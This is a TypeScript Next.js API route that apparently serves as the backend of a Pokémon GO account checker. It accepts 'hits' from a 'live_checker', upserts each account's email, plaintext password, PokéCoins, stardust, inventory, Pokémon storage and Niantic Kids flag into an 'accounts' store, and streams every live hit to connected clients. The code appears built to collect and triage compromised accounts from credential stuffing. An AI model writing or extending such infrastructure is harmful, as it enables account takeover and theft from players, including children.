import { NextResponse } from "next/server";
import { getDb, isMongoConfigured, initIndexes } from "@/lib/mongodb";

export async function POST(req: Request) {
  try {
    const apiKey = req.headers.get("x-api-key");
    const expectedKey = process.env.CHECKER_API_KEY;

    if (!expectedKey || !apiKey || apiKey.trim() !== expectedKey.trim()) {
      return NextResponse.json({ error: "Unauthorized checker key." }, { status: 401 });
    }

    const payload = await req.json();
    const accountData = payload.account || payload;

    if (!accountData || !accountData.email) {
      return NextResponse.json({ error: "Account email is required." }, { status: 400 });
    }

    if (!isMongoConfigured()) {
      return NextResponse.json(
        { warning: "MongoDB Atlas not connected, hit received but not saved to DB." },
        { status: 200 }
      );
    }

    await initIndexes();
    const db = await getDb();

    const normalizedEmail = String(accountData.email).trim().toLowerCase();

    const docToUpsert = {
      email: normalizedEmail,
      password: accountData.password || "",
      level: accountData.level,
      pokeCoins: accountData.pokeCoins !== undefined && accountData.pokeCoins !== null ? Number(accountData.pokeCoins) : 0,
      stardust: accountData.stardust !== undefined && accountData.stardust !== null ? Number(accountData.stardust) : 0,
      itemBag: accountData.itemBag ?? null,
      pokemonStorage: accountData.pokemonStorage ?? null,
      isFirstTimeBuyer: accountData.isFirstTimeBuyer ?? null,
      isNianticKidsUser: Boolean(accountData.isNianticKidsUser),
      team: accountData.team ?? "none",
      gameEmail: accountData.gameEmail || normalizedEmail,
      country: accountData.country || "",
      error: accountData.error || null,
      source: "live_checker",
      extractedAt: new Date(),
      updatedAt: new Date(),
    };

    await db.collection("accounts").updateOne(
      { email: normalizedEmail },
      { $set: docToUpsert },
      { upsert: true }
    );

    // Broadcast instant live hit to connected SSE clients
    if (global._vaultHitEmitter) {
      global._vaultHitEmitter.emit("hit", {
        ...docToUpsert,
        _id: `live-${Date.now()}`,
        extractedAt: docToUpsert.extractedAt.toISOString(),
      });
    }

    return NextResponse.json({ success: true, email: normalizedEmail });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : "Internal push error";
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
